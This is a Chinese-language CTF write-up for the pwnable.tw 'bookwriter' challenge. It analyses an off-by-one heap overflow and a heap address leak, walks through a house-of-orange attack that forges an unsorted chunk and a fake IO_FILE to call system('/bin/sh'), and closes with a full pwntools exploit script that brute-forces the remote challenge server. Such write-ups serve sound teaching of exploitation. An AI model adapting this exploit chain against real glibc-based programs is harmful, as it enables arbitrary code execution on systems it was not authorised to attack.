## book writer wp

### 题目分析

题目很简单明了，考察的点也很直接就是对house of orange 的利用。漏洞在于在进行edit的时候如果没有'\x00'截断那么可以溢出一个字节，从而覆盖下一个chunk的size字段。

```c
int edit()
{
  unsigned int v1; // [rsp+Ch] [rbp-4h]

  printf("Index of page :");
  v1 = read_num();
  if ( v1 > 7 )
  {
    puts("out of page:");
    exit(0);
  }
  if ( !ptr_array[v1] )
    return puts("Not found !");
  printf("Content:");
  readn((__int64)ptr_array[v1], size_array[v1]);

  size_array[v1] = strlen(ptr_array[v1]);//strlen 没有截断可以把后面的size也算进来

  return puts("Done !");
```

还有就是在显示info的时候如果作者的名字恰好是0x40个字节没有'\x00'截断的话也可以打印出后面的堆地址，造成堆地址的泄露。

整道题没有free函数考察的就是对house of orange的利用。

#### 漏洞利用

首先利用show_info打印一个堆地址出来。

在整个house of orange的过程中有很多细节。首先因为后面要伪造unsorted chunk所以，在覆盖topchunk的size之前一定要先将top chunk压缩到很小大概在0x1000字节左右。

```python
a.sendafter("Author :", 'a' * 0x40)
add(0xd60,"aaaa")#0
add(0x1f021 - 0x1010,"aaaa")#1 adjust the topchunk's size for fake unsorted chunk
```

在压缩的过程中，要注意的有两点：

- 后面使用scanf进行输出的时候会申请0x1000大小的chunk且不会释放，所以一定要考虑到。

- 另外申请的大小一定不能大于0x20000，可以分多次进行压缩。

压缩完了topchunk之后就可以选择合适的size将topchunk的size字段覆盖掉，一定要注意对齐！

```python
    add(0x68,"aaaa")#2
    edit(0x2,'a' * 0x68)
    payload = 'a' * 0x68 + '\xf1'+ '\x01'#overwrite the topchunk's size
```

之后申请一块大于当前topchunk大小的chunk，topchunk就会被放到unsorted bin中。申请的时候顺便将unsorted bin伪造好，因为后面要进行overlap所以要将overlap之后的大chunk的后面环境伪造好。

```python
    payload = 0x100 * 'a' 
    payload += p64(0x1300) + p64(0x21) + 'a' * 0x10
    payload += p64(0) + p64(0x21) + 'a' * 0x200 
    add(0x300,payload)#3 unsorted bin  fake big unsorted bin
```

之后再把这块unsorted bin的size第二次覆盖，这样就形成了overlap，这块大的unsorted bin包裹着刚申请的3号0x300的小chunk。

利用unsorted bin中的libc地址，通过多次申请把libc地址转移到到3号chunk中，然后打印出来。就可以泄露libc地址。

之后再通过多次申请就可以把这块unsorted chunk的size压缩到0x60的大小为后面的sop做准备。这时这块unsorted chunk已经完全在3号chunk的控制之下，通过随3号chunk的edit就可以改变这块0x60大小的chunk的fd,bk,content。

通过edit布置好house of orange所需的bk和fake IO_FILE。之后申请一个0x10大小的chunk就可以完成整个sop。

因为地址随机化的原因所以需要爆破。

#### EXP：

```python
#coding=utf-8
from pwn import *
local = 0
exec_file="./bookwriter"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
if local :
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so",checksec = False) 
else:
    libc=ELF("./libc_64.so.6")
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(size, content):
    menu(1)
    a.sendlineafter("Size of page :", str(size))
    a.sendafter("Content :",content)
    return 

def info():
    menu(4)
    #a.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ", str(1))
    #a.sendlineafter("Author :", author)
    return 
    
def edit(idx,content):
    menu(3)
    a.sendlineafter("Index of page :",str(idx))
    a.sendafter("Content:",content)
    return 
    
def show(idx):
    menu(2)
    a.sendlineafter("Index of page :",str(idx))
    return 
def exp():
    a.sendafter("Author :", 'a' * 0x40)
    add(0xd60,"aaaa")#0
    add(0x1f021 - 0x1010,"aaaa")#1 adjust the topchunk's size for fake unsorted chunk

    info()
    a.recvuntil('a' * 0x40)
    heap_addr = u64(a.recv(4).ljust(0x8,"\x00"))
    fuck(heap_addr)
    a.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ", str(0))


    add(0x68,"aaaa")#2
    edit(0x2,'a' * 0x68)
    payload = 'a' * 0x68 + '\xf1'+ '\x01'#overwrite the topchunk's size


    edit(0x2, payload)

    payload = 0x100 * 'a' 
    payload += p64(0x1300) + p64(0x21) + 'a' * 0x10
    payload += p64(0) + p64(0x21) + 'a' * 0x200 
    add(0x300,payload)#3 unsorted bin  fake big unsorted bin
    '''
    payload = 'a' * (0x1f0 - 0xb0)

    payload += p64(0) + p64(0x71) + 'a' * 0x60
    payload += p64(0) + p64(0x21) + 'a' * 0x10
    payload += p64(0) + p64(0x21) + 'a' * 0x10
    '''

    payload = 'a' * 0x68 + p16(0x1301)
    edit(0x2,payload)#chunk_overlap


    add(0x1298 - (0x10 + 0xa0),"aaaaa")#4
    show(0x3)
    a.recvuntil("Content :\n")
    libc_base = u64(a.recv(6) + 2 *'\x00') -libc.sym["__malloc_hook"] - 0x10 - 88
    fuck(libc_base)

    #debug()
    add(0x110 - 0x70,"aaaa") # make size == 0x60
    payload = (0x100 - 0x60) * 'a'
    payload += "/bin/sh\x00" + p64(0x61) + p64(libc_base + libc.sym["__malloc_hook"] + 88 + 0x10) + p64(libc_base + libc.sym["_IO_list_all"] - 0x10)
    fuck_array = [p64(2), p64(3),

        'a' * 8, p64(0), # vtable
        p64(0), p64(libc_base + libc.symbols['system']),

        'a' * 0x70,
        p64(0), p64(0),
        p64(0), p64(heap_addr + 0x210d0)] # vtable_ptr
    payload += flat(fuck_array)
    print len(payload)
    edit(0x3,payload)
    menu(1)
    a.sendlineafter("Size of page :", str(0x10))
    sleep(0.5)
    a.sendline("ls")
    a.recv(2)
    #a.sendline("ls")


while 1:
    try:
        #a=process(exec_file)
        a= remote("chall.pwnable.tw",10304)
        exp()
        a.interactive()
        break
    except:
        a.close()
```

